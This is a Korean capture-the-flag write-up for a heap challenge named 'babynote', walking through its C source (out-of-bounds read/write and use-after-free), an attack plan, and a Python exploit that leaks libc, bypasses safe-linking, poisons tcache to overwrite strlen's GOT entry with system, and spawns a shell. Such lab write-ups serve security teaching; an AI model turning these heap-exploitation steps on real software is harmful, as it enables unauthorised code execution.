# pwn-hspace_babynote

# Usage
- 2024.07#0

# Concept
- Use-After_Free

# Writeup

####  chall.py
```c
    while (1){
        menu();
        int choice;
        printf(">> ");
        scanf("%d", &choice);
        switch (choice){
            case 1:
                add();
                break;
            case 2:
                edit();
                break;
            case 3:
                show();
                break;
            case 4:
                delete();
                break;
            case 5:
                exit(0);
                break;
            default:
                puts("Invalid choice");
                break;
        }
    }
```
일반적인 노트 문제와 같이 add, edit, show, delete 메뉴가 주어집니다.

```c
void add()
{
    int idx, lines;
    char buf[0x100];
    printf("Page: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= 20){
        puts("Invalid index");
        return;
    }
    printf("Lines: ");
    scanf("%d", &lines);
    char* temp = (char*)malloc(lines*0x10ULL);
    if (temp == NULL){
        puts("malloc failed");
        return;
    }
    pages[idx] = temp;
    printf("Note: ");
    read(0, pages[idx], lines*0x10ULL);
}
```
add 메뉴로 최대 20개까지 (사용자가 입력한 line * 0x10)의 크기로 청크를 할당하고 입력할 수 있습니다.


```c
void edit()
{
    int idx;
    printf("Page: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= 20){
        puts("Invalid index");
        return;
    }
    if (pages[idx] == NULL){
        puts("Invalid index");
        return;
    }
    char* cur = pages[idx];
    printf("Line: ");
    scanf("%d", &idx);
    cur += 0x10ULL*idx;
    printf("Note: ");
    read(0, cur, 0x10ULL);
}
```
edit 메뉴로 할당받은 청크부터 임의의 offset만큼 떨어진 주소에 0x10만큼 write할 수 있는 OOB Write 취약점이 주어집니다. (*Note: 음수 offset도 가능)

```c
void show()
{
    int idx;
    printf("Page: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >=20){
        puts("Invalid index");
        return;
    }
    if (pages[idx] == NULL){
        puts("Invalid index");
        return;
    }
    char* cur = pages[idx];
    printf("Line: ");
    scanf("%d", &idx);
    cur += 0x10ULL*idx;
    printf("%s", cur);
}
```
마찬가지로 show 메뉴에서도 할당된 청크로부터 임의 offset만큼 떨어진 주소에서 0x10만큼 read할 수 있는 OOB 취약점이 주어집니다.

```c
void delete()
{
    int idx;
    printf("Page: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= 20){
        puts("Invalid index");
        return;
    }
    if (pages[idx] == NULL){
        puts("Invalid index");
        return;
    }
    free(pages[idx]);
}
```
마지막으로 delete 메뉴에서는 할당된 청크를 해제하지만, pages 배열에서 클리어하지 않아 dangling pointer에 접근할 수 있습니다. 


#### Exploit Scenario
정리해보면 힙에서 자유롭게 relative-read/write를 할 수 있는 상황입니다. 거기에 더해 UAF가 가능하기 때문에 다음과 같은 익스플로잇 시나리오를 구성할 수 있습니다.

- unsorted bin에 청크를 넣고 show를 사용하여 main_arena(->libc base)를 릭
- tcache에 청크를 넣고 edit 기능으로 next를 strlen@plt.got-0x10으로 설정 (tcache poisoning)
- 이후 strlen@got-0x10에 청크를 할당받아 strlen@plt.got를 system으로 overwrite
- printf("%s", '/bin/sh')를 호출해서 쉘 획득 

이를 구현한 익스플로잇 코드는 다음과 같습니다.

#### ex.py
```python

def exploit(p):
    offset = 0x21a090 # strlen_evex@got

    for i in range(8):
        add(10+i,0x400,b"A"*0x10)
    for i in range(7): # fill tcache
        delete(11+i)
    delete(10) # free -> unsorted bin 
    show(10, 0) # main_arena leak
    libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x21ace0
    log.info("libc_base: 0x{:x}".format(libc_base))
    system = libc_base + libc.sym["system"]
    add(0, 0x10, b"/bin/sh\x00"*2) # chunk for printf("%s", '/bin/sh')
    add(1, 0x10, b"A"*0x10)
    add(2, 0x10, b"A"*0x10)
    delete(1)
    delete(2)

    show(2, 0) # bypass safe linking
    leak = u64(p.recv(6).ljust(8, b"\x00"))
    heap_ptr = decrypt(leak)
    log.info("heap_ptr: 0x{:x}".format(heap_ptr))
    edit(2, 0, p64(encrypt(libc_base+offset))*2) # tcache poisoning
    add(3, 0x10, "AAAAA")
    add(3, 0x10, p64(system)*2) # overwrite strlen_evx@got
    show(0,0) # trigger printf("%s", '/bin/sh')

    p.sendline("cat flag.txt")
    print(p.recv(0x100))
    p.interactive()
    return
```
